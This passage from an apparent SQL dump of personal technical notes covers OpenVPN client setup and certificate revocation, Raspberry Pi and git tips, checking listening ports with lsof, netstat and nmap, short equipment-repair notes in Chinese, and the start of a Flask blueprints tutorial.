typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>chmod 700 ~/client-configs/make_config.sh </code></li>\r\n</ul>\r\n\r\n<h2>Step 11: Generate Client Configurations</h2>\r\n\r\n<p>Now, we can easily generate client configuration files.</p>\r\n\r\n<p>If you followed along with the guide, you created a client certificate and key called <code>client1.crt</code> and <code>client1.key</code> respectively by running the <code>./build-key client1</code> command in step 6. We can generate a config for these credentials by moving into our <code>~/client-configs</code> directory and using the script we made:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/client-configs </code></li>\r\n	<li><code>./make_config.sh client1 </code></li>\r\n</ul>\r\n\r\n<p>If everything went well, we should have a <code>client1.ovpn</code> file in our <code>~/client-configs/files</code> directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>ls ~/client-configs/files </code></li>\r\n</ul>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>client1.ovpn </code></p>\r\n\r\n<h3>Transferring Configuration to Client Devices</h3>\r\n\r\n<p>We need to transfer the client configuration file to the relevant device. For instance, this could be your local computer or a mobile device.</p>\r\n\r\n<p>While the exact applications used to accomplish this transfer will depend on your choice and device&#39;s operating system, you want the application to use SFTP (SSH file transfer protocol) or SCP (Secure Copy) on the backend. This will transport your client&#39;s VPN authentication files over an encrypted connection.</p>\r\n\r\n<p>Here is an example SFTP command using our client1.ovpn example. This command can be run from your local computer (OS X or Linux). It places the <code>.ovpn</code> file in your home directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sftp sammy@openvpn_server_ip:client-configs/files/client1.ovpn ~/ </code></li>\r\n</ul>\r\n\r\n<p>Here are several tools and tutorials for securely transferring files from the server to a local computer:</p>\r\n\r\n<ul>\r\n	<li><a href=\"http://winscp.net\">WinSCP</a></li>\r\n	<li><a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-sftp-to-securely-transfer-files-with-a-remote-server\">How To Use SFTP to Securely Transfer Files with a Remote Server</a></li>\r\n	<li><a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-filezilla-to-transfer-and-manage-files-securely-on-your-vps\">How To Use Filezilla to Transfer and Manage Files Securely on your VPS</a></li>\r\n</ul>\r\n\r\n<h2>Step 12: Install the Client Configuration</h2>\r\n\r\n<p>Now, we&#39;ll discuss how to install a client VPN profile on Windows, OS X, iOS, and Android. None of these client instructions are dependent on one another, so feel free to skip to whichever is applicable to you.</p>\r\n\r\n<p>The OpenVPN connection will be called whatever you named the <code>.ovpn</code> file. In our example, this means that the connection will be called <code>client1.ovpn</code> for the first client file we generated.</p>\r\n\r\n<h3>Windows</h3>\r\n\r\n<p><strong>Installing</strong></p>\r\n\r\n<p>The OpenVPN client application for Windows can be found on <a href=\"https://openvpn.net/index.php/open-source/downloads.html\">OpenVPN&#39;s Downloads page</a>. Choose the appropriate installer version for your version of Windows.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Note</p>\r\n\r\n<p>OpenVPN needs administrative privileges to install.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>After installing OpenVPN, copy the <code>.ovpn</code> file to:</p>\r\n\r\n<pre>\r\n<code>C:\\Program Files\\OpenVPN\\config\r\n</code></pre>\r\n\r\n<p>When you launch OpenVPN, it will automatically see the profile and makes it available.</p>\r\n\r\n<p>OpenVPN must be run as an administrator each time it&#39;s used, even by administrative accounts. To do this without having to right-click and select <strong>Run as administrator</strong> every time you use the VPN, you can preset this, but this must be done from an administrative account. This also means that standard users will need to enter the administrator&#39;s password to use OpenVPN. On the other hand, standard users can&#39;t properly connect to the server unless the OpenVPN application on the client has admin rights, so the elevated privileges are necessary.</p>\r\n\r\n<p>To set the OpenVPN application to always run as an administrator, right-click on its shortcut icon and go to <strong>Properties</strong>. At the bottom of the <strong>Compatibility</strong> tab, click the button to <strong>Change settings for all users</strong>. In the new window, check <strong>Run this program as an administrator</strong>.</p>\r\n\r\n<p><strong>Connecting</strong></p>\r\n\r\n<p>Each time you launch the OpenVPN GUI, Windows will ask if you want to allow the program to make changes to your computer. Click <strong>Yes</strong>. Launching the OpenVPN client application only puts the applet in the system tray so that the VPN can be connected and disconnected as needed; it does not actually make the VPN connection.</p>\r\n\r\n<p>Once OpenVPN is started, initiate a connection by going into the system tray applet and right-clicking on the OpenVPN applet icon. This opens the context menu. Select <strong>client1</strong> at the top of the menu (that&#39;s our <code>client1.ovpn</code> profile) and choose <strong>Connect</strong>.</p>\r\n\r\n<p>A status window will open showing the log output while the connection is established, and a message will show once the client is connected.</p>\r\n\r\n<p>Disconnect from the VPN the same way: Go into the system tray applet, right-click the OpenVPN applet icon, select the client profile and click <strong>Disconnect</strong>.</p>\r\n\r\n<h3>OS X</h3>\r\n\r\n<p><strong>Installing</strong></p>\r\n\r\n<p><a href=\"https://tunnelblick.net/\">Tunnelblick</a> is a free, open source OpenVPN client for Mac OS X. You can download the latest disk image from the <a href=\"https://tunnelblick.net/downloads.html\">Tunnelblick Downloads page</a>. Double-click the downloaded <code>.dmg</code> file and follow the prompts to install.</p>\r\n\r\n<p>Towards the end of the installation process, Tunnelblick will ask if you have any configuration files. It can be easier to answer <strong>No</strong> and let Tunnelblick finish. Open a Finder window and double-click <code>client1.ovpn</code>. Tunnelblick will install the client profile. Administrative privileges are required.</p>\r\n\r\n<p><strong>Connecting</strong></p>\r\n\r\n<p>Launch Tunnelblick by double-clicking Tunnelblick in the <strong>Applications</strong> folder. Once Tunnelblick has been launched, there will be a Tunnelblick icon in the menu bar at the top right of the screen for controlling connections. Click on the icon, and then the <strong>Connect</strong> menu item to initiate the VPN connection. Select the <strong>client1</strong> connection.</p>\r\n\r\n<h3>Linux</h3>\r\n\r\n<p>Installing</p>\r\n\r\n<p>If you are using Linux, there are a variety of tools that you can use depending on your distribution. Your desktop environment or window manager might also include connection utilities.</p>\r\n\r\n<p>The most universal way of connecting, however, is to just use the OpenVPN software.</p>\r\n\r\n<p>On Ubuntu or Debian, you can install it just as you did on the server by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo apt-get update </code></li>\r\n	<li><code>sudo apt-get install openvpn </code></li>\r\n</ul>\r\n\r\n<p>On CentOS you can enable the EPEL repositories and then install it by typing:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo yum install epel-release </code></li>\r\n	<li><code>sudo yum install openvpn </code></li>\r\n</ul>\r\n\r\n<p>Configuring</p>\r\n\r\n<p>Check to see if your distribution includes a <code>/etc/openvpn/update-resolv-conf</code> script:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>ls /etc/openvpn </code></li>\r\n</ul>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p><code>Output</code></p>\r\n\r\n<p><code>update-resolve-conf </code></p>\r\n\r\n<p>Next, edit the OpenVPN client configuration file you transfered:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>nano client1.ovpn </code></li>\r\n</ul>\r\n\r\n<p>Uncomment the three lines we placed in to adjust the DNS settings if you were able to find an <code>update-resolv-conf</code> file:</p>\r\n\r\n<p>client1.ovpn</p>\r\n\r\n<pre>\r\n<code>script-security 2\r\nup /etc/openvpn/update-resolv-conf\r\ndown /etc/openvpn/update-resolv-conf\r\n</code></pre>\r\n\r\n<p>If you are using CentOS, change the <code>group</code> from <code>nogroup</code> to <code>nobody</code> to match the distribution&#39;s available groups:</p>\r\n\r\n<p>client1.ovpn</p>\r\n\r\n<pre>\r\n<code>group nobody\r\n</code></pre>\r\n\r\n<p>Save and close the file.</p>\r\n\r\n<p>Now, you can connect to the VPN by just pointing the <code>openvpn</code> command to the client configuration file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo openvpn --config client1.ovpn </code></li>\r\n</ul>\r\n\r\n<p>This should connect you to your server.</p>\r\n\r\n<h3>iOS</h3>\r\n\r\n<p><strong>Installing</strong></p>\r\n\r\n<p>From the iTunes App Store, search for and install <a href=\"https://itunes.apple.com/us/app/id590379981\">OpenVPN Connect</a>, the official iOS OpenVPN client application. To transfer your iOS client configuration onto the device, connect it directly to a computer.</p>\r\n\r\n<p>Completing the transfer with iTunes will be outlined here. Open iTunes on the computer and click on <strong>iPhone</strong> &gt; <strong>apps</strong>. Scroll down to the bottom to the <strong>File Sharing</strong> section and click the OpenVPN app. The blank window to the right, <strong>OpenVPN Documents</strong>, is for sharing files. Drag the <code>.ovpn</code> file to the OpenVPN Documents window.</p>\r\n\r\n<p><img alt=\"iTunes showing the VPN profile ready to load on the iPhone\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/1.png\" /></p>\r\n\r\n<p>Now launch the OpenVPN app on the iPhone. There will be a notification that a new profile is ready to import. Tap the green plus sign to import it.</p>\r\n\r\n<p><img alt=\"The OpenVPN iOS app showing new profile ready to import\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/2.png\" /></p>\r\n\r\n<p><strong>Connecting</strong></p>\r\n\r\n<p>OpenVPN is now ready to use with the new profile. Start the connection by sliding the <strong>Connect</strong> button to the <strong>On</strong> position. Disconnect by sliding the same button to <strong>Off</strong>.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Note</p>\r\n\r\n<p>The VPN switch under <strong>Settings</strong> cannot be used to connect to the VPN. If you try, you will receive a notice to only connect using the OpenVPN app.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><img alt=\"The OpenVPN iOS app connected to the VPN\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/3.png\" /></p>\r\n\r\n<h3>Android</h3>\r\n\r\n<p><strong>Installing</strong></p>\r\n\r\n<p>Open the Google Play Store. Search for and install <a href=\"https://play.google.com/store/apps/details?id=net.openvpn.openvpn\">Android OpenVPN Connect</a>, the official Android OpenVPN client application.</p>\r\n\r\n<p>The <code>.ovpn</code> profile can be transferred by connecting the Android device to your computer by USB and copying the file over. Alternatively, if you have an SD card reader, you can remove the device&#39;s SD card, copy the profile onto it and then insert the card back into the Android device.</p>\r\n\r\n<p>Start the OpenVPN app and tap the menu to import the profile.</p>\r\n\r\n<p><img alt=\"The OpenVPN Android app profile import menu selection\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/4.png\" /></p>\r\n\r\n<p>Then navigate to the location of the saved profile (the screenshot uses <code>/sdcard/Download/</code>) and select the file. The app will make a note that the profile was imported.</p>\r\n\r\n<p><img alt=\"The OpenVPN Android app selecting VPN profile to import\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/5.png\" /></p>\r\n\r\n<p><strong>Connecting</strong></p>\r\n\r\n<p>To connect, simply tap the <strong>Connect</strong> button. You&#39;ll be asked if you trust the OpenVPN application. Choose <strong>OK</strong> to initiate the connection. To disconnect from the VPN, go back to the OpenVPN app and choose <strong>Disconnect</strong>.</p>\r\n\r\n<p><img alt=\"The OpenVPN Android app ready to connect to the VPN\" src=\"https://assets.digitalocean.com/articles/openvpn_ubunutu/6.png\" /></p>\r\n\r\n<h2>Step 13: Test Your VPN Connection</h2>\r\n\r\n<p>Once everything is installed, a simple check confirms everything is working properly. Without having a VPN connection enabled, open a browser and go to <a href=\"https://www.dnsleaktest.com\">DNSLeakTest</a>.</p>\r\n\r\n<p>The site will return the IP address assigned by your internet service provider and as you appear to the rest of the world. To check your DNS settings through the same website, click on <strong>Extended Test</strong> and it will tell you which DNS servers you are using.</p>\r\n\r\n<p>Now connect the OpenVPN client to your Droplet&#39;s VPN and refresh the browser. The completely different IP address of your VPN server should now appear. That is now how you appear to the world. Again, <a href=\"https://www.dnsleaktest.com\">DNSLeakTest&#39;s</a> <strong>Extended Test</strong> will check your DNS settings and confirm you are now using the DNS resolvers pushed by your VPN.</p>\r\n\r\n<h2>Step 14: Revoking Client Certificates</h2>\r\n\r\n<p>Occasionally, you may need to revoke a client certificate to prevent further access to the OpenVPN server.</p>\r\n\r\n<p>To do so, enter your CA directory and re-source the <code>vars</code> file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>cd ~/openvpn-ca </code></li>\r\n	<li><code>source vars </code></li>\r\n</ul>\r\n\r\n<p>Next, call the <code>revoke-full</code> command using the client name that you wish to revoke:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>./revoke-full client3 </code></li>\r\n</ul>\r\n\r\n<p>This will show some output, ending in <code>error 23</code>. This is normal and the process should have successfully generated the necessary revocation information, which is stored in a file called <code>crl.pem</code> within the <code>keys</code> subdirectory.</p>\r\n\r\n<p>Transfer this file to the <code>/etc/openvpn</code> configuration directory:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo cp ~/openvpn-ca/keys/crl.pem /etc/openvpn </code></li>\r\n</ul>\r\n\r\n<p>Next, open the OpenVPN server configuration file:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo nano /etc/openvpn/server.conf </code></li>\r\n</ul>\r\n\r\n<p>At the bottom of the file, add the <code>crl-verify</code> option, so that the OpenVPN server checks the certificate revocation list that we&#39;ve created each time a connection attempt is made:</p>\r\n\r\n<p>/etc/openvpn/server.conf</p>\r\n\r\n<pre>\r\n<code>crl-verify crl.pem\r\n</code></pre>\r\n\r\n<p>Save and close the file.</p>\r\n\r\n<p>Finally, restart OpenVPN to implement the certificate revocation:</p>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<ul>\r\n	<li><code>sudo systemctl restart openvpn@server </code></li>\r\n</ul>\r\n\r\n<p>The client should now longer be able to successfully connect to the server using the old credential.</p>\r\n\r\n<p>To revoke additional clients, follow this process:</p>\r\n\r\n<ol>\r\n	<li>Generate a new certificate revocation list by sourcing the <code>vars</code> file in the <code>~/openvpn-ca</code> directory and then calling the <code>revoke-full</code> script on the client name.</li>\r\n	<li>Copy the new certificate revocation list to the <code>/etc/openvpn</code> directory to overwrite the old list.</li>\r\n	<li>Restart the OpenVPN service.</li>\r\n</ol>\r\n\r\n<p>This process can be used to revoke any certificates that you&#39;ve previously issued for your server.</p>\r\n\r\n<h2>Conclusion</h2>\r\n\r\n<p>Congratulations! You are now securely traversing the internet protecting your identity, location, and traffic from snoopers and censors.</p>\r\n\r\n<p>To configure more clients, you only need to follow steps <strong>6</strong>, and <strong>11-13</strong> for each additional device. To revoke access to clients, follow step <strong>14</strong>.</p>\r\n','2018-02-06 02:33:32','How To Set Up an OpenVPN Server on Ubuntu 16.04'),(73,'yebin','<h1>上海市斜土路768号致远大厦25楼O座。021-6303 2788。你说上海弛邦电子</h1>\r\n\r\n<h1><a href=\"https://null-byte.wonderhowto.com/forum/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics-0179407/\">Hack a Raspberry Pi with Metasploit | Metasploit Exploitation Basics</a></h1>\r\n\r\n<p>https://null-byte.wonderhowto.com/forum/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics-0179407/</p>\r\n','2018-02-06 09:37:08','Hack a Raspberry Pi with Metasploit | Metasploit Exploitation Basics'),(74,'yebin','<p>静安区民防办指挥车维护，修复左侧17寸显示器的av显示问题，新出现的问题有：800兆信号不稳定，云台摄像机雨刮不好用，变焦不好用，左前支撑腿有时候放不下来。</p>\r\n','2018-02-07 02:33:30','静安民防维护 - 20180207'),(75,'yebin','<p>Write Raspbian IMG On Linux (So Easy!):</p>\r\n\r\n<p><code>ls -la /dev/sd* (check before and after plugging SD card)</code></p>\r\n\r\n<p>Download Raspbian image <a href=\"https://www.raspberrypi.org/downloads/raspbian/\" target=\"_blank\">HERE</a></p>\r\n\r\n<p>Write with following commands:</p>\r\n\r\n<pre>\r\n<code>sudo dd if=/home/username/Downloads/2012-10-28-wheezy-raspbian.img of=/dev/sdc</code></pre>\r\n\r\n<p><code>or</code></p>\r\n\r\n<pre>\r\n<code>sudo dd if=/home/username/Downloads/2012-10-28-wheezy-raspbian.img of=/dev/sdc status=progress bs=4M</code></pre>\r\n','2018-02-07 06:40:57','Write Raspbian IMG On Linux'),(76,'yebin','<pre>\r\n<a href=\"https://stackoverflow.com/questions/41233378/cloning-specific-branch\">Cloning specific branch</a>\r\n<code>git clone &lt;url of repo&gt; -b &lt;branch name to be cloned&gt;</code></pre>\r\n','2018-02-07 07:51:58','Git Cloning Specific Branch'),(77,'yebin','<h1><a href=\"http://www.circuitbasics.com/how-to-set-up-the-dht11-humidity-sensor-on-the-raspberry-pi/\" target=\"_blank\">How to Set Up the DHT11 Humidity Sensor on the Raspberry Pi</a></h1>\r\n','2018-02-07 07:58:40','How to Set Up the DHT11 Humidity Sensor on the Raspberry Pi'),(78,'yebin','<p>海康威视摄像机送修，地址在徐汇区斜土路768号致远大厦25楼O座。联系人王工。</p>\r\n','2018-02-07 11:03:23','海康送修地址'),(79,'yebin','<h1>How to check if port is in use on Linux or Unix</h1>\r\n\r\n<p><a href=\"https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/\" target=\"_blank\">Original Link</a></p>\r\n\r\n<h2>How to check the listening ports and applications on Linux:</h2>\r\n\r\n<ol>\r\n	<li>Open a terminal application i.e. shell prompt.</li>\r\n	<li>Run any one of the following command:<br />\r\n	<kbd>sudo lsof -i -P -n | grep LISTEN </kbd><br />\r\n	<kbd>sudo netstat -tulpn | grep LISTEN</kbd><br />\r\n	<kbd>sudo nmap -sTU -O IP-address-Here</kbd></li>\r\n</ol>\r\n\r\n<p>Let us see commands and its output in details.</p>\r\n\r\n<h2>Option #1: lsof command</h2>\r\n\r\n<p>The syntax is:<br />\r\n<code>$ sudo lsof -i -P -n<br />\r\n$ sudo lsof -i -P -n | grep LISTEN<br />\r\n$ doas lsof -i -P -n | grep LISTEN ### [OpenBSD] ###</code><br />\r\nSample outputs:</p>\r\n\r\n<p><a href=\"https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/lsof-outputs/\"><img alt=\"Fig.01: Check the listening ports and applications with lsof command\" src=\"https://www.cyberciti.biz/media/new/faq/2016/11/lsof-outputs.png\" style=\"height:52px; width:599px\" /></a></p>\r\n\r\n<p>Fig.01: Check the listening ports and applications with lsof command</p>\r\n\r\n<p><br />\r\nConsider the last line from above outputs:</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<pre>\r\nsshd    85379     root    3u  IPv4 0xffff80000039e000      0t0  TCP 10.86.128.138:22 (LISTEN)</pre>\r\n\r\n<ul>\r\n	<li><kbd><strong>sshd</strong></kbd> is the name of the application.</li>\r\n	<li><kbd><strong>10.86.128.138</strong></kbd> is the IP address to which sshd application bind to (LISTEN)</li>\r\n	<li><kbd><strong>22</strong></kbd> is the TCP port that is being used (LISTEN)</li>\r\n	<li><kbd><strong>85379</strong></kbd> is the process ID of the sshd process</li>\r\n</ul>\r\n\r\n<h2>Option #2: netstat command</h2>\r\n\r\n<p>You can check the listening ports and applications with netstat as follows.</p>\r\n\r\n<h3>Linux netstat syntax</h3>\r\n\r\n<p><code>$ netstat -tulpn | grep LISTEN</code></p>\r\n\r\n<h3>FreeBSD/MacOS X netstat syntax</h3>\r\n\r\n<p><code>$ netstat -anp tcp | grep LISTEN<br />\r\n$ netstat -anp udp | grep LISTEN</code></p>\r\n\r\n<h3>OpenBSD netstat syntax</h3>\r\n\r\n<p><code>$ netstat -na -f inet | grep LISTEN<br />\r\n$ netstat -nat | grep LISTEN</code></p>\r\n\r\n<h2>Option #3: nmap command</h2>\r\n\r\n<p>The syntax is:<br />\r\n<code>$ sudo nmap -sT -O localhost<br />\r\n$ sudo nmap -sU -O 192.168.2.13 ##[ list open UDP ports ]##<br />\r\n$ sudo nmap -sT -O 192.168.2.13 ##[ list open TCP ports ]##</code><br />\r\nSample outputs:</p>\r\n\r\n<p><a href=\"https://www.cyberciti.biz/faq/unix-linux-check-if-port-is-in-use-command/nmap-outputs/\"><img alt=\"Fig.02: Determines which ports are listening for TCP connections using nmap\" src=\"https://www.cyberciti.biz/media/new/faq/2016/11/nmap-outputs.png\" style=\"height:466px; width:599px\" /></a></p>\r\n\r\n<p>Fig.02: Determines which ports are listening for TCP connections using nmap</p>\r\n\r\n<p><br />\r\nYou can combine TCP/UDP scan in a single command:<br />\r\n<code>$ sudo nmap -sTU -O 192.168.2.13</code></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>A note about Windows users</h2>\r\n\r\n<p>You can check port usage from Windows operating system using following command:<br />\r\n<code>netstat -bano | more<br />\r\nnetstat -bano | grep LISTENING<br />\r\nnetstat -bano | findstr /R /C:&quot;[LISTEING]&quot;</code></p>\r\n','2018-02-08 08:19:42','How to check if port is in use on Linux or Unix'),(80,'yebin','<h1>Structuring Larger Flask Applications</h1>\r\n\r\n<p><a href=\"https://www.rithmschool.com/courses/intermediate-flask/structuring-larger-flask-applications\" target=\"_blank\">Original Link</a></p>\r\n\r\n<h3>Objectives:</h3>\r\n\r\n<p>By the end of this chapter, you should be able to:</p>\r\n\r\n<ul>\r\n	<li>Explain what the MVC pattern is and why it&#39;s useful</li>\r\n	<li>Structure larger Flask applications using blueprints</li>\r\n	<li>Refactor previous applications to use a more scalable structure</li>\r\n</ul>\r\n\r\n<h3>Blueprints</h3>\r\n\r\n<p>Our applications are getting a bit out of hand. Right now we are placing all of our configuration settings, database logic and routing logic inside of a single file, our <code>app.py</code>. Imagine what would happen if we had dozens of models and resources that we were doing CRUD on? We need a better system for organizing our code, and Flask gives us one! It&#39;s called <code>blueprints</code>.</p>\r\n\r\n<p>Before we get into blueprints, let&#39;s discuss a very common pattern of structuring parts of a large application. It&#39;s called the <strong>M</strong>odel <strong>V</strong>iew <strong>C</strong>ontroller (or <strong>MVC</strong>) pattern, and it is prevalent in larger frameworks like Ruby on Rails.</p>\r\n\r\n<h3>MVC</h3>\r\n\r\n<p>MVC is a design pattern for building web applications. Traditionally, your application is structured into three parts:</p>\r\n\r\n<ul>\r\n	<li>\r\n	<p><code>Model</code> - a model is responsible for managing data storage, retrieval, and validation in an application. The models we have made in SQLAlchemy do just that!</p>\r\n	</li>\r\n	<li>\r\n	<p><code>View</code> - the view is what a user sees. We should strive to minimize the amount of logic in our views as we want to keep them as simple as possible, and delegate logic to our controller.</p>\r\n	</li>\r\n	<li>\r\n	<p><code>Controller</code> - the brains (or business logic) behind the operation. The controller is responsible for talking to the model when necessary and updating the view. The controller is where actions are actually processed and determines what data to retrieve from the Model, how to package it, and update the View with that data.</p>\r\n	</li>\r\n</ul>\r\n\r\n<p>You can read much more about MVC summarized with legos <a href=\"https://realpython.com/blog/python/the-model-view-controller-mvc-paradigm-summarized-with-legos/\" target=\"_blank\">here</a>. For more attempts to explain the pattern in concrete terms, check out this <a href=\"https://www.quora.com/Whats-the-easiest-way-to-explain-RailsMVC-structure\" target=\"_blank\">Quora question</a>. You can also read more about the communication between the model, controller, and view <a href=\"http://softwareengineering.stackexchange.com/questions/234116/model-view-controller-does-the-user-interact-with-the-view-or-with-the-controll\" target=\"_blank\">here</a>.</p>\r\n\r\n<h3>Getting started with our first blueprint</h3>\r\n\r\n<p>Now that we have an idea of what MVC is, we are going to break apart pieces of our application to adhere to this structure. This is going to make our folder structure a bit larger, but tremendously reduce the amount of code we have in our <code>app.py</code>. Let&#39;s create a new application and start with a single resource, <code>Owner</code>. Here is what our folder structure is going to look like:</p>\r\n\r\n<pre>\r\n.\r\n├── app.py # file to start the server\r\n├── manage.py # file to set up migrations \r\n├── project # the root folder for all of our resources\r\n    # the main file for defining our app variable and registering blueprints \r\n│&nbsp;&nbsp; ├── __init__.py \r\n    # templates for ALL other templates to inherit from\r\n│&nbsp;&nbsp; ├── templates\r\n│&nbsp;&nbsp; │&nbsp;&nbsp; └── base.html\r\n    # a folder for one resouce (other resources will look just like this)\r\n│&nbsp;&nbsp; └── owners\r\n        # WTForms configuration\r\n│&nbsp;&nbsp;     ├── forms.py\r\n        # SQLAlchemy configuration (if you only have a few models you can put them in one single file,\r\n        # this structure abstracts each model to its own file)\r\n│&nbsp;&nbsp;     ├── models.py\r\n        # All templates specific to that resource\r\n│&nbsp;&nbsp;     ├── templates\r\n|       |   |---owners\r\n|       |    # All templates specific to that resource\r\n│&nbsp;&nbsp;     │&nbsp;&nbsp;     ├── index.html\r\n│&nbsp;&nbsp;     │&nbsp;&nbsp;     ├── edit.html\r\n│&nbsp;&nbsp;     │&nbsp;&nbsp;     ├── show.html\r\n│&nbsp;&nbsp;     │&nbsp;      └── new.html\r\n        # The controller for this resource. This is where our routes live\r\n│&nbsp;&nbsp;     └── views.py\r\n</pre>\r\n\r\n<h3>Necessary files</h3>\r\n\r\n<p>Now that we have this folder structure, let&#39;s start by creating a virtual environment</p>\r\n\r\n<pre>\r\nmkvirtualenv flask-blueprints\r\nworkon flask-blueprints\r\ncreatedb flask-blueprints\r\npip install flask psycopg2 flask-sqlalchemy flask-migrate flask-wtf flask-modus\r\n</pre>\r\n\r\n<p>Let&#39;s first set up our <code>manage.py</code> file. This will look the same as all of our other ones.</p>\r\n\r\n<pre>\r\nfrom project import app,db\r\nfrom flask_script import Manager\r\nfrom flask_migrate import Migrate,MigrateCommand\r\n\r\nmigrate = Migrate(app, db)\r\n\r\nmanager = Manager(app)\r\nmanager.add_command(&#39;db&#39;, MigrateCommand)\r\n\r\nif __name__ == &#39;__main__&#39;:\r\n    manager.run()\r\n</pre>\r\n\r\n<p>Now we need to set up our <code>project/__init__.py</code> file to configure flask:</p>\r\n\r\n<pre>\r\nfrom flask import Flask\r\nfrom flask_sqlalchemy import SQLAlchemy\r\nfrom flask_modus import Modus\r\n\r\napp = Flask(__name__)\r\nmodus = Modus(app)\r\n\r\napp.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;postgres://localhost/flask-blueprints&#39;\r\napp.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] = False\r\ndb = SQLAlchemy(app)\r\n\r\n# import a blueprint that we will create\r\nfrom project.owners.views import owners_blueprint\r\n\r\n# register our blueprints with the application\r\napp.register_blueprint(owners_blueprint, url_prefix=&#39;/owners&#39;)\r\n\r\n@app.route(&#39;/&#39;)\r\ndef root():\r\n    return &quot;HELLO BLUEPRINTS!&quot;\r\n</pre>\r\n\r\n<p>We are importing a blueprint that does not exist yet, so let&#39;s head to our <code>/project/owners/views.py</code> file and create a blueprint</p>\r\n\r\n<pre>\r\nfrom flask import Blueprint  # we will import much more later\r\n\r\n# let&#39;s create the owners_blueprint to register in our __init__.py\r\nowners_blueprint = Blueprint(\r\n    &#39;owners&#39;,\r\n    __name__,\r\n    template_folder=&#39;templates&#39;\r\n)\r\n\r\n</pre>\r\n\r\n<p>Next, let&#39;s create our model. Inside of our <code>project/owners/models.py</code> let&#39;s create a model for an owner:</p>\r\n\r\n<pre>\r\nfrom project import db\r\n\r\nclass Owner(db.Model):\r\n    __tablename__ = &#39;owners&#39;\r\n\r\n    id = db.Column(db.Integer, primary_key=True)\r\n    first_name = db.Column(db.Text)\r\n    last_name = db.Column(db.Text)\r\n\r\n    def __init__(self, first_name, last_name):\r\n        self.first_name = first_name\r\n        self.last_name = last_name\r\n</pre>\r\n\r\n<p>Finally, let&#39;s import our newly created model in our <code>views.py</code>. You&#39;ll get a warning from your linter saying that you&#39;re importing something that you&#39;re not using; that&#39;s okay for now, we&#39;ll need to use the <code>Owner</code> model later on when we dig into the routing.</p>\r\n\r\n<pre>\r\nfrom flask import Blueprint\r\nfrom project.owners.models import Owner\r\n\r\nowners_blueprint = Blueprint(\r\n  &#39;owners&#39;,\r\n  __name__,\r\n  template_folder = &#39;templates&#39;\r\n)\r\n</pre>\r\n\r\n<p>For now, since we&#39;ve imported our Owner model, we can run our migrations. Let&#39;s create our migrations folder, pending migration and then run the migration.</p>\r\n\r\n<pre>\r\npython manage.py db init\r\npython manage.py db migrate\r\npython manage.py db upgrade\r\n</pre>\r\n\r\n<p>Now we need to set up our <code>app.py</code> file to start the server:</p>\r\n\r\n<pre>\r\nfrom project import app\r\n\r\nif __name__ == &#39;__main__&#39;:\r\n    app.run(debug=True, port=3000)\r\n</pre>\r\n\r\n<p>We should be able to run <code>python app.py</code> and start a server! If you head to <a href=\"http://localhost:3000\" target=\"_blank\">http://localhost:3000</a> we should see &quot;HELLO BLUEPRINTS!&quot;. You also might be wondering what <code>project</code> is that we are importing. That is actually the <code>__init__.py</code> file inside of the project folder!</p>\r\n\r\n<p>Before moving on, you may want to create a few owners inside of IPython so that you have some data to work with as we begin implementing full CRUD.</p>\r\n\r\n<h3>Starting on CRUD</h3>\r\n\r\n<p>Let&#39;s make sure we first have a <code>project/templates/base.html</code> file:</p>\r\n\r\n<pre>\r\n&lt;!DOCTYPE html&gt;\r\n&lt;html lang=&quot;en&quot;&gt;\r\n&lt;head&gt;\r\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\r\n    &lt;title&gt;Blueprints App&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n    {% block content %}\r\n    {% endblock %}\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n</pre>\r\n\r\n<h3>Index</h3>\r\n\r\n<p>Now let&#39;s build the route and view necessary to display our owners. We will be adding routes in our <code>project/owners/views.py</code> file. Remember, we will not be using a decorator of <code>@app</code>, we will be using 